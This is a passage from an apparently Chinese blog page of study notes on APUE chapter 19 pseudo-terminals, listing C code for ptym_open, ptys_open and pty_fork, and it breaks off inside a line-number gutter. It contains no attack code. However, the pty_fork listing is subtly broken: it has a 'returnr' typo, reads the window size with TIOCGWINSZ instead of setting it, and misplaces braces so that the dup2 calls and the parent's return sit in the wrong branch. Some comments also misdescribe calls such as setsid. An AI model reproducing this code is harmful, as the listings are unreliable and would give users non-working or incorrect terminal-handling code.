class="hljs-comment">//返回值：若成功，返回指向PTY从设备名的指针；若出错，返回NULL</span><br></code></pre></td></tr></table></figure><p><code>ptym_open</code>打开<code>PTY</code>主设备文件描述符，<code>ptys_open</code>打开<code>PTY</code>从设备文件描述符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;apue.h&quot;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">ptym_open</span><span class="hljs-params">(<span class="hljs-type">char</span> *pts_name, <span class="hljs-type">int</span> pts_namesz)</span>;<br><span class="hljs-comment">//返回值：若成功，返回PTY主设备文件描述符；若出错，返回-1</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">ptys_open</span><span class="hljs-params">(<span class="hljs-type">char</span> *pts_name)</span>;<br><span class="hljs-comment">//返回值：若成功，返回PTY从设备问而建描述符：若出错，返回-1</span><br></code></pre></td></tr></table></figure><p><strong>19-9</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(SOLARIS)</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stropt.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <br><span class="hljs-title function_">ptym_open</span><span class="hljs-params">(<span class="hljs-type">char</span> *pts_name, <span class="hljs-type">int</span> pts_namesz)</span><br>&#123;<br>    <span class="hljs-type">char</span> *ptr;<br>    <span class="hljs-type">int</span> fdm, err;<br><br>    <span class="hljs-keyword">if</span> ((fdm = posix_openpt(O_RDWR)) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//打开pty设备</span><br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">if</span> (grantpt(fdm) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//授予访问从设备的权限</span><br>        <span class="hljs-keyword">goto</span> errout; <br>    <span class="hljs-keyword">if</span> (unlockpt(fdm) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//解锁从设备</span><br>        <span class="hljs-keyword">goto</span> errout;<br>    <span class="hljs-keyword">if</span> ((ptr = ptsname(fdm)) == <span class="hljs-literal">NULL</span>) <span class="hljs-comment">//获取从设备路径</span><br>        <span class="hljs-keyword">goto</span> errout;<br>    <br>    <span class="hljs-built_in">strncpy</span>(pts_name, ptr, pts_namesz); <span class="hljs-comment">//存放从设备的路径</span><br>    pts_name[pts_namesz - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    <span class="hljs-keyword">return</span>(fdm);<br><br>errout:<br>    err = errno;<br>    close(fdm);<br>    errno = err;<br>    <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <br><span class="hljs-title function_">ptys_open</span><span class="hljs-params">(<span class="hljs-type">char</span> *pts_name)</span><br>&#123;<br>    <span class="hljs-type">int</span> fds;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(SOLARIS)</span><br>    <span class="hljs-type">int</span> err, setup;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-keyword">if</span> ((fds = open(pts_name, O_RDWR)) &lt; <span class="hljs-number">0</span>) <br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(SOLARIS)</span><br>    <span class="hljs-keyword">if</span> ((setup = ioctl(fds, I_FIND, <span class="hljs-string">&quot;ldterm&quot;</span>)) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">goto</span> errout;<br>    <br>    <span class="hljs-keyword">if</span> (setup == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (ioctl(fds, I_PUSH, <span class="hljs-string">&quot;pterm&quot;</span>) &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">goto</span> errout;<br>        <span class="hljs-keyword">if</span> (ioctl(fds, I_PUSH, <span class="hljs-string">&quot;ldterm&quot;</span>) &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">goto</span> errout;<br>        <span class="hljs-keyword">if</span> (ioctl(fds, I_PUSH, <span class="hljs-string">&quot;ttcompat&quot;</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>errout:<br>    err = errno;<br>    close(fds);<br>    errno = err;<br>    <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-keyword">return</span>(fds);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="pty-fork"><a href="#pty-fork" class="headerlink" title="pty_fork"></a>pty_fork</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;apue.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;termios.h&gt;</span></span><br><br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">pty_fork</span><span class="hljs-params">(<span class="hljs-type">int</span> *ptrfdm, <span class="hljs-type">char</span> *slave_name, <span class="hljs-type">int</span> slave_namesz,</span><br><span class="hljs-params">              <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> termios *slave_termios,</span><br><span class="hljs-params">              <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> winsize *slave_winsize)</span>;<br><br><span class="hljs-comment">//返回值：子进程中返回0；父进程中返回子进程的进程ID；若出错，返回-1</span><br></code></pre></td></tr></table></figure><ul><li><code>slave_name</code>：  存放从设备名</li><li><code>slave_termios</code>：若不为空，则初始化为设备的终端行规程，若为空，则把从设备<code>termios</code>结构设置成实现定义的初始状态</li><li><code>slave_winsize</code>：若不为空，则根据指针指向的结构体初始化设备的窗口大小。若为空，<code>winsize</code>结构体被初始化为0</li></ul><p><strong>19-10.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;termio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(SOLARIS)</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stropt.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <br><span class="hljs-title function_">ptym_open</span><span class="hljs-params">(<span class="hljs-type">char</span> *pts_name, <span class="hljs-type">int</span> pts_namesz)</span><br>&#123;<br>    <span class="hljs-type">char</span> *ptr;<br>    <span class="hljs-type">int</span> fdm, err;<br><br>    <span class="hljs-keyword">if</span> ((fdm = posix_openpt(O_RDWR)) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//打开pty设备</span><br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">if</span> (grantpt(fdm) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//授予访问从设备的权限</span><br>        <span class="hljs-keyword">goto</span> errout; <br>    <span class="hljs-keyword">if</span> (unlockpt(fdm) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//解锁从设备</span><br>        <span class="hljs-keyword">goto</span> errout;<br>    <span class="hljs-keyword">if</span> ((ptr = ptsname(fdm)) == <span class="hljs-literal">NULL</span>) <span class="hljs-comment">//获取从设备路径</span><br>        <span class="hljs-keyword">goto</span> errout;<br>    <br>    <span class="hljs-built_in">strncpy</span>(pts_name, ptr, pts_namesz); <span class="hljs-comment">//存放从设备的路径</span><br>    pts_name[pts_namesz - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    <span class="hljs-keyword">return</span>(fdm);<br><br>errout:<br>    err = errno;<br>    close(fdm);<br>    errno = err;<br>    <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <br><span class="hljs-title function_">ptys_open</span><span class="hljs-params">(<span class="hljs-type">char</span> *pts_name)</span><br>&#123;<br>    <span class="hljs-type">int</span> fds;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(SOLARIS)</span><br>    <span class="hljs-type">int</span> err, setup;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-keyword">if</span> ((fds = open(pts_name, O_RDWR)) &lt; <span class="hljs-number">0</span>) <br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(SOLARIS)</span><br>    <span class="hljs-keyword">if</span> ((setup = ioctl(fds, I_FIND, <span class="hljs-string">&quot;ldterm&quot;</span>)) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">goto</span> errout;<br>    <br>    <span class="hljs-keyword">if</span> (setup == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (ioctl(fds, I_PUSH, <span class="hljs-string">&quot;pterm&quot;</span>) &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">goto</span> errout;<br>        <span class="hljs-keyword">if</span> (ioctl(fds, I_PUSH, <span class="hljs-string">&quot;ldterm&quot;</span>) &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">goto</span> errout;<br>        <span class="hljs-keyword">if</span> (ioctl(fds, I_PUSH, <span class="hljs-string">&quot;ttcompat&quot;</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>errout:<br>    err = errno;<br>    close(fds);<br>    errno = err;<br>    <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-keyword">return</span>(fds);<br>&#125;<br><br><span class="hljs-type">pid_t</span> <br><span class="hljs-title function_">pty_fork</span><span class="hljs-params">(<span class="hljs-type">int</span> *ptrfdm, <span class="hljs-type">char</span> *slave_name, <span class="hljs-type">int</span> slave_namesz,</span><br><span class="hljs-params">        <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> termios *slave_termios,</span><br><span class="hljs-params">        <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> winsize *slave_winsize)</span><br>&#123;<br>    <span class="hljs-type">int</span> fdm, fds;<br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-type">char</span> pts_name[<span class="hljs-number">20</span>];<br><br>    <span class="hljs-keyword">if</span> ((fdm = ptym_open(pts_name, <span class="hljs-keyword">sizeof</span>(pts_name))) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//打开主设备，会将从设备路径存放在pts_name</span><br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;can&#x27;t open master pty: %s, error %d&quot;</span>, pts_name, fdm);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (slave_name != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">strncpy</span>(slave_name, pts_name, slave_namesz);<br>        slave_name[slave_namesz - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((pid = fork()) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">//子进程</span><br>        <span class="hljs-keyword">if</span> (setsid() &lt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">//设置进程的用户ID</span><br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;setsid error&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((fds = ptys_open(pts_name)) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//打开从设备</span><br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;can&#x27;t open slave pty&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        close(fdm);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(BSD)</span><br>    <span class="hljs-keyword">if</span> (ioctl(fds, TIOCSCTTY, (<span class="hljs-type">char</span> *)<span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;TIOCSCTTY error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>        <span class="hljs-keyword">if</span> (slave_termios != <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-keyword">if</span> (tcsetattr(fds, TCSANOW, slave_termios) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//终端的行为</span><br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;tcsetattr error on slave pty&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (slave_winsize != <span class="hljs-literal">NULL</span>) &#123;<br>                <span class="hljs-keyword">if</span> (ioctl(fds, TIOCGWINSZ, slave_winsize) &lt; <span class="hljs-number">0</span>)<br>                &#123;<br>                    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;TIOCSWINSZ error on slave pty&quot;</span>);<br>                    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (dup2(fds, STDIN_FILENO) != STDIN_FILENO)<br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;dup2 error to stdin&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (dup2(fds, STDOUT_FILENO) != STDOUT_FILENO)<br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;dup2 error to stdout&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (dup2(fds, STDERR_FILENO) != STDERR_FILENO)<br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;error to stderr&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (fds != STDIN_FILENO &amp;&amp; fds != STDOUT_FILENO &amp;&amp; fds != STDERR_FILENO)<br>                close(fds);<br>            returnr(<span class="hljs-number">0</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            *ptrfdm = fdm;<br>            <span class="hljs-keyword">return</span>(pid);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>19-11.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span 